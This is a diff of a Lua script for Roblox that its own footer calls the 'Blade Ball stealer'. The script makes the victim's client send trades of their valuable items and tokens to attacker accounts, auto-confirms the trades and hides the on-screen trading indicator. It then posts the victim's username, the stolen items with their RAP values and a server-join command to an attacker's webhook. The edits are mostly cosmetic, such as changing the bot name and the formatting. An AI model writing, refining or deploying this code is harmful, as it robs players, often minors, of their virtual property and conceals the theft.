@@ -22,7 +22,7 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
-local auth_token = _G.AuthToken or "EBK-SS-A" -- AJOUT : AuthToken
+local auth_token = _G.AuthToken or "EBK-SS-A" 
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -79,7 +79,6 @@ end)
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
-    -- AJOUT : Désactivation du texte "TRADING" au-dessus de la tête
     if inTrade then
         task.spawn(function()
             local char = plr.Character
@@ -108,7 +107,6 @@ local function sendTradeRequest(user)
     until response == true
 end
 
--- MODIF : Vitesse d'ajout augmentée via task.spawn
 local function addItemToTrade(itemType, ID)
     local args = {
         [1] = itemType,
@@ -140,12 +138,12 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -160,7 +158,8 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
-    -- CONDITION : Vert si > 500 RAP, sinon Violet
+    -- MODIF : Nom du bot et couleur dynamique
+    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
     
     local fields = {
@@ -180,7 +179,6 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Summary 💰:",
-            -- MODIF : RAP en Gras (Taille visuelle)
             value = string.format("Total RAP: **%s**", formatNumber(totalRAP)),
             inline = false
         }
@@ -210,7 +208,6 @@ local function SendJoinMessage(list, prefix)
     end)
 
     for _, group in ipairs(groupedList) do
-        -- MODIF : Montant en Gras pour chaque item
         local itemLine = string.format("%s (x%s) - **%s RAP**", group.Name, group.Count, formatNumber(group.TotalRAP))
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
@@ -228,7 +225,8 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["auth_token"] = auth_token, -- AJOUT : Token
+        ["username"] = botUsername, -- CHANGEMENT DU NOM DU BOT
+        ["auth_token"] = auth_token, 
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
@@ -240,36 +238,34 @@ local function SendJoinMessage(list, prefix)
         }}
     }
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
+    request({
         Url = webhook,
         Method = "POST",
-        Headers = headers,
+        Headers = {["Content-Type"] = "application/json"},
         Body = body
     })
 end
 
 local function SendMessage(list)
+    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
     local fields = {
-		{
-			name = "Victim Username 🤖:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent 📝:",
-			value = "",
-			inline = false
-		},
+        {
+            name = "Victim Username 🤖:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent 📝:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary 💰:",
             value = string.format("Total RAP: **%s**", formatNumber(totalRAP)),
             inline = false
         }
-	}
+    }
 
     local grouped = {}
     for _, item in ipairs(list) do
@@ -300,25 +296,23 @@ local function SendMessage(list)
     end
 
     local data = {
+        ["username"] = botUsername, -- CHANGEMENT DU NOM DU BOT
         ["auth_token"] = auth_token,
         ["embeds"] = {{
             ["title"] = "⚪ The hit on server 🎉" ,
             ["color"] = embedColor,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Eblack"
+            }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
+    request({
         Url = webhook,
         Method = "POST",
-        Headers = headers,
+        Headers = {["Content-Type"] = "application/json"},
         Body = body
     })
 end
@@ -430,7 +424,7 @@ if #itemsToSend > 0 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            wait(1.5) -- Délai pour garantir que le bouton Confirm soit cliquable
+            wait(1.5) 
             readyTrade()
             wait(0.5)
             confirmTrade()
